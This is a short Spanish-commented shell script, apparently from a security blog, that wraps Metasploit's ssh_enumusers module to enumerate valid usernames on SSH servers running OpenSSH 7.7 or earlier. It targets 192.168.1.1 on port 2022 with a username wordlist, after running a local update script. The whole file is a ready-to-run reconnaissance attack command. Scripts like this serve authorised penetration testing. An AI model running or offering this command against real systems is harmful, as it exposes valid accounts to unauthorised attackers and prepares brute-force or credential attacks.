#!/bin/sh
# Ver usuarios existentes en OpenSSH 7.7 y versiones anteriores
# Antonio Taboada - hackingyseguridad.com 2025
# OpenSSH < 7.7 - User Enumeration
# Descargar diccionario de usuarios

echo
echo "Enumeración de usuarios SSH, versiones OpenSSH 7.7 y anteriores"
echo
echo "..."
sh /home/antonio/ssha/actualizar.sh

# Ejecutamos metaxploit
# para salir teclea exit
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS 192.168.1.1;  set RPORT 2022; set USER_FILE /home/antonio/ssha/usuarios.txt; run"


